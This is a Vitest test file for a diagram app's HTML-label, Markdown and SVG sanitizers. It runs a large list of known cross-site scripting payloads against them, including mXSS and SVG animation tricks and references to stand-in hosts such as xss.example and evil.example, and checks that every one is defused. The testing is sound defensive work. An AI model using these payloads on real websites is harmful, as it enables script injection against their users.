import { describe, expect, it } from 'vitest';
import { readdirSync, readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { Graph } from '@maxgraph/core';
import { isSafeCss, sanitizeHtmlLabel, sanitizeMarkdownFragment, sanitizeSvgMarkup } from '../sanitize';
import { installDrawioHtmlLabels } from '../../drawio-shapes/engine/html-labels';
import { setupGraph } from '../../ui/setup-graph';
import { sanitizeHtml } from '../../scenarios/markdown';

const ROOT = resolve(__dirname, '../../..');

/**
 * Known XSS payloads (OWASP XSS filter evasion cheat sheet, PortSwigger cheat sheet, DOMPurify's
 * mXSS / namespace-confusion test cases).
 */
const PAYLOADS = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=https://xss.example/xss.js></SCRIPT>',
  '<img src=x onerror=alert(1)>',
  '<IMG SRC="javascript:alert(\'XSS\');">',
  '<IMG SRC=JaVaScRiPt:alert(1)>',
  '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
  '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\\>',
  '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
  '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
  '<IMG SRC="jav&#x09;ascript:alert(1);">',
  '<IMG SRC=" &#14;  javascript:alert(1);">',
  '<a href="java\u0000script:alert(1)">x</a>',
  '<a href=" JaVa\tscript:alert(4)">b</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
  '<object data="data:text/html,<script>alert(1)</script>"></object>',
  '<embed src="javascript:alert(1)">',
  '<img src="data:text/html,<script>alert(1)</script>">',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a></svg>',
  '<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a></svg>',
  '<svg><set attributeName="href" to="javascript:alert(1)" /><a><text>x</text></a></svg>',
  '<svg><a><animate attributeName="href" to="javascript:alert(1)" begin="0"/><text x="0" y="20">click</text></a></svg>',
  '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>',
  '<math><mi><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>"></path></textarea></mtext></svg></mglyph></mi></math>',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<style><img src=x onerror=alert(1)></style>',
  '<style>@import "https://xss.example/x.css";</style>',
  '<title><img src=x onerror=alert(1)></title>',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<xmp><img src=x onerror=alert(1)></xmp>',
  '<template><img src=x onerror=alert(1)></template>',
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<svg><style><img src=x onerror=alert(1)></style></svg>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<div style="width: expression(alert(1))">x</div>',
  '<div style="-moz-binding:url(https://xss.example/xss.xml#xss)">x</div>',
  '<div style="background:url(&quot;jav\\61script:alert(1)&quot;)">x</div>',
  '<div style="position:fixed;inset:0;z-index:99999">overlay</div>',
  '<body onload=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<button formaction=javascript:alert(1)>x</button>',
  '<form action="javascript:alert(1)"><input type=submit></form>',
  '<base href="javascript:alert(1)//">',
  '<link rel=import href="https://xss.example/x.html">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<a href="#" onclick="alert(1)">x</a>',
  '<div onmouseover="alert(1)">x</div>',
  '<video><source onerror="alert(1)"></video>',
  '<audio src=x onerror=alert(1)>',
  '<marquee onstart=alert(1)>',
  '<isindex type=image src=1 onerror=alert(1)>',
  '<object data="javascript:alert(1)">',
  '<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)">x</a>',
  '<div><![CDATA[</div><script>alert(1)//]]></div>',
  '<!--><img src=x onerror=alert(1)>-->',
  '<img src="x` `<script>alert(1)</script>"` `>',
  '<a href="javascript&colon;alert(1)">x</a>',
  '<a href="&#x6A;avascript:alert(1)">x</a>',
  '<img srcset="x 1x, javascript:alert(1) 2x">',
  '<div id="x"><img name="body"><form name="cookie"></form></div>',
];

/** Parses `html` like maxGraph does (innerHTML into a div) and reports anything that can run. */
function findDanger(html: string): string[] {
  const div = document.createElement('div');
  div.innerHTML = html;
  const found: string[] = [];
  const walk = (el: Element): void => {
    const name = el.localName.toLowerCase();
    if (['script', 'iframe', 'object', 'embed', 'base', 'meta', 'link', 'form', 'animate', 'set', 'foreignobject', 'style', 'noscript', 'template'].includes(name)) {
      found.push(`<${name}>`);
    }
    for (const attr of Array.from(el.attributes)) {
      // eslint-disable-next-line no-control-regex
      const value = attr.value.replace(/[\u0000- ]+/g, '').toLowerCase();
      if (/^on/i.test(attr.name)) found.push(`${name}@${attr.name}`);
      if (/^(javascript|vbscript):|^data:text\/html/.test(value)) found.push(`${name}@${attr.name}=${value}`);
      if (attr.name === 'style' && !isSafeCss(attr.value)) found.push(`${name}@style=${attr.value}`);
    }
    for (const child of Array.from(el.children)) walk(child);
  };
  walk(div);
  return found;
}

describe('sanitizeHtmlLabel (draw.io HTML labels)', () => {
  it.each(PAYLOADS)('defuses %s', (payload) => {
    const once = sanitizeHtmlLabel(payload);
    expect(findDanger(once)).toEqual([]);
    expect(once).not.toMatch(/<(script|svg|math|animate|set|iframe|object|embed|style|form|base|meta|link)\b/i);
    // maxGraph parses the label again (innerHTML) and serialises it; must stay clean (mXSS)
    const div = document.createElement('div');
    div.innerHTML = once;
    expect(findDanger(div.innerHTML)).toEqual([]);
    expect(sanitizeHtmlLabel(div.innerHTML)).toBe(div.innerHTML);
  });

  it('keeps what draw.io labels use', () => {
    const labels = [
      '<div style="font-size: 1px"><font color="#ff0000">S4</font><br><b>x</b></div>',
      '<font face="Helvetica" size="3" color="#000000">Signal <i>S1</i> <u>main</u></font>',
      '<span style="background-color: rgb(255, 255, 255); font-family: &quot;Courier New&quot;;">km 12+345</span>',
      '<h1 style="margin-top: 0px;">Heading</h1><p>Lorem ipsum</p>',
      '<ul><li>a</li><li>b</li></ul><ol><li>c</li></ol>',
      '<table border="1" width="100%" cellpadding="4" style="width:100%;height:100%;border-collapse:collapse;"><tbody><tr><td align="center"><b>Hdr</b></td></tr><tr><td>v</td></tr></tbody></table>',
      '<a href="https://example.com/doc">doc</a> <a href="#page2">p2</a> <a href="mailto:a@b.c">m</a>',
      '<img src="data:image/png;base64,AAAA"> <img src="https://example.com/a.png" width="16" height="16">',
      '<div style="background-image: url(&quot;data:image/png;base64,AAAA&quot;);">bg</div>',
      '<sup>2</sup><sub>i</sub><strike>old</strike><s>x</s><hr><pre>code</pre><blockquote>q</blockquote>',
      'A &amp; B &lt; C',
      'plain text',
    ];
    for (const html of labels) {
      const div = document.createElement('div');
      div.innerHTML = html;
      expect(sanitizeHtmlLabel(html)).toBe(div.innerHTML);
    }
  });

  it('adds rel=noopener to links that open a window', () => {
    expect(sanitizeHtmlLabel('<a href="https://x.y" target="_blank">x</a>')).toBe(
      '<a href="https://x.y" target="_blank" rel="noopener noreferrer">x</a>'
    );
  });

  it('renders every html=1 label of the draw.io palettes and the app libraries unchanged', () => {
    const labels = new Set<string>();
    const addFromXml = (xml: string): void => {
      const doc = new DOMParser().parseFromString(xml, 'text/xml');
      for (const el of Array.from(doc.querySelectorAll('mxCell, object, UserObject'))) {
        const cell = el.localName === 'mxCell' ? el : el.querySelector('mxCell');
        if (!/(^|;)html=1/.test(cell?.getAttribute('style') ?? '')) continue;
        const value = el.localName === 'mxCell' ? el.getAttribute('value') : el.getAttribute('label');
        if (value && /[<&]/.test(value)) labels.add(value);
      }
    };
    const paletteDir = resolve(ROOT, 'src/drawio-shapes/palettes/data');
    for (const file of readdirSync(paletteDir).filter((f) => f.endsWith('.json'))) {
      const data = JSON.parse(readFileSync(resolve(paletteDir, file), 'utf8')) as { entries?: Array<Record<string, unknown>> };
      for (const entry of data.entries ?? []) {
        if (typeof entry.value === 'string' && /html=1/.test(String(entry.style)) && /[<&]/.test(entry.value)) labels.add(entry.value);
        if (typeof entry.xml === 'string') addFromXml(entry.xml);
      }
    }
    for (const lib of ['ertms.xml', 'ertms-extra.xml', 'railway-pl.xml', 'track-layout.xml']) {
      const doc = new DOMParser().parseFromString(readFileSync(resolve(ROOT, 'public/libraries', lib), 'utf8'), 'text/xml');
      const entries = JSON.parse(doc.documentElement.textContent ?? '[]') as Array<{ xml?: string }>;
      for (const entry of entries) if (entry.xml?.startsWith('<')) addFromXml(entry.xml);
    }
    for (const file of ['compat-multipage.drawio']) {
      addFromXml(readFileSync(resolve(ROOT, 'src/services/__tests__/fixtures/drawio', file), 'utf8'));
    }
    expect(labels.size).toBeGreaterThan(50);
    // compared as rendered (DOMPurify returns markup-free text as is: `&#8226;` stays an entity)
    const rendered = (html: string): string => {
      const div = document.createElement('div');
      div.innerHTML = html;
      return div.innerHTML;
    };
    const changed: string[] = [];
    for (const html of labels) if (rendered(sanitizeHtmlLabel(html)) !== rendered(html)) changed.push(html);
    expect(changed).toEqual([]);
  }, 120_000);
});

describe('sanitizing getLabel is the outermost wrapper', () => {
  it('sanitizes what placeholders / UserObject labels produce', () => {
    const graph = new Graph(document.createElement('div'));
    try {
      setupGraph(graph, 'thumbnail');
      const doc = document.implementation.createDocument(null, null, null);
      const obj = doc.createElement('object');
      obj.setAttribute('label', '<b>%name%</b>');
      obj.setAttribute('placeholders', '1');
      obj.setAttribute('name', '<img src=x onerror=alert(1)><svg><animate attributeName=href to=javascript:alert(2)>');
      const cell = graph.insertVertex(graph.getDefaultParent(), null, obj, 0, 0, 10, 10, { html: true } as never);
      const label = graph.getLabel(cell) ?? '';
      expect(label).toContain('<b>');
      expect(findDanger(label)).toEqual([]);
      expect(label).not.toMatch(/onerror|<svg|<animate|javascript:/i);
    } finally {
      graph.destroy();
    }
  });

  it('re-wraps when another getLabel wrapper was added after it', () => {
    const graph = new Graph(document.createElement('div'));
    try {
      installDrawioHtmlLabels(graph);
      const base = graph.getLabel.bind(graph);
      graph.getLabel = (cell) => `${base(cell) ?? ''}<img src=x onerror=alert(1)>`;
      installDrawioHtmlLabels(graph);
      const cell = graph.insertVertex(graph.getDefaultParent(), null, 'x', 0, 0, 10, 10, { html: true } as never);
      expect(graph.getLabel(cell)).toBe('x<img src="x">');
    } finally {
      graph.destroy();
    }
  });
});

describe('Markdown sanitizer (DOMPurify profile)', () => {
  it.each(PAYLOADS)('defuses %s', (payload) => {
    const holder = document.createElement('div');
    holder.appendChild(sanitizeMarkdownFragment(payload));
    expect(findDanger(holder.innerHTML)).toEqual([]);
    expect(holder.innerHTML).not.toMatch(/<(script|svg|math|animate|set|iframe|object|embed|style|form|base|meta|link)\b/i);
  });

  it('keeps the renderer tags and fixes links, inputs and images', () => {
    const holder = document.createElement('div');
    holder.appendChild(
      sanitizeHtml(
        '<h2>T</h2><p><strong>a</strong> <a href="https://x.y" onclick="z()">l</a> <a href="#s">s</a></p>' +
          '<ul><li class="rd-md-task"><input type="checkbox" checked> t</li></ul><input type="text">' +
          '<img src="javascript:alert(1)" alt="bad"><img src="https://x.y/i.png" alt="ok"><code class="evil">c</code>'
      )
    );
    expect(holder.innerHTML).toBe(
      '<h2>T</h2><p><strong>a</strong> <a href="https://x.y" target="_blank" rel="noopener noreferrer">l</a> ' +
        '<a href="#s" target="_blank" rel="noopener noreferrer">s</a></p>' +
        '<ul><li class="rd-md-task"><input type="checkbox" checked="" disabled=""> t</li></ul>' +
        'bad<img src="https://x.y/i.png" alt="ok"><code>c</code>'
    );
  });
});

describe('SVG sanitizer (PlantUML server answers)', () => {
  const svg = (body: string): string =>
    `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="50" viewBox="0 0 100 50">${body}</svg>`;

  it('keeps a PlantUML-like drawing', () => {
    const input = svg(
      '<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs>' +
        '<g><rect x="1" y="2" width="30" height="20" fill="url(#g)" style="stroke:#181818;stroke-width:0.5;"/>' +
        '<text x="5" y="15" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="20">Alice</text>' +
        '<path d="M0,0 L10,10" fill="none" stroke="#181818"/><line x1="0" y1="0" x2="5" y2="5"/>' +
        '<image width="4" height="4" xlink:href="data:image/png;base64,AAAA"/><a href="#g"><text>link</text></a><use xlink:href="#g"/></g>'
    );
    const out = sanitizeSvgMarkup(input);
    const doc = new DOMParser().parseFromString(out, 'image/svg+xml');
    expect(doc.documentElement.localName).toBe('svg');
    expect(doc.getElementsByTagName('parsererror')).toHaveLength(0);
    expect(out).toContain('viewBox="0 0 100 50"');
    expect(out).toContain('fill="url(#g)"');
    expect(out).toContain('textLength="20"');
    expect(out).toContain('>Alice</text>');
    expect(out).toContain('xlink:href="data:image/png;base64,AAAA"');
    expect(out).toContain('<a href="#g">');
    expect(out).toContain('<use xlink:href="#g"/>');
  });

  it.each([
    '<script>alert(1)</script>',
    '<g onload="alert(1)"><rect onclick="alert(2)"/></g>',
    '<a xlink:href="javascript:alert(1)"><text>x</text></a>',
    '<a href="https://evil.example/"><text>x</text></a>',
    '<animate xlink:href="#a" attributeName="href" values="javascript:alert(1)"/><a id="a"><text>x</text></a>',
    '<set attributeName="href" to="javascript:alert(1)"/>',
    '<animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="1s"/>',
    '<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)"/></body></foreignObject>',
    '<image xlink:href="https://evil.example/track.png"/>',
    '<image href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="/>',
    '<use href="https://evil.example/sprites.svg#x"/>',
    '<use xlink:href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=#x"/>',
    '<style>@import url(https://evil.example/x.css); rect { fill: url(https://evil.example/t) }</style>',
    '<rect style="fill:url(https://evil.example/t)"/>',
    '<rect filter="url(https://evil.example/f.svg#f)"/>',
    '<handler type="application/ecmascript">alert(1)</handler>',
  ])('removes %s', (body) => {
    const out = sanitizeSvgMarkup(svg(body));
    expect(out).not.toMatch(/<script|onload|onclick|onerror|javascript:|evil\.example|<animate|<set\b|foreignObject|<handler|data:image\/svg/i);
    expect(new DOMParser().parseFromString(out, 'image/svg+xml').documentElement.localName).toBe('svg');
  });

  it('rejects non-SVG documents', () => {
    expect(() => sanitizeSvgMarkup('<html xmlns="http://www.w3.org/1999/xhtml"/>')).toThrow();
    expect(() => sanitizeSvgMarkup('<svg')).toThrow();
  });
});
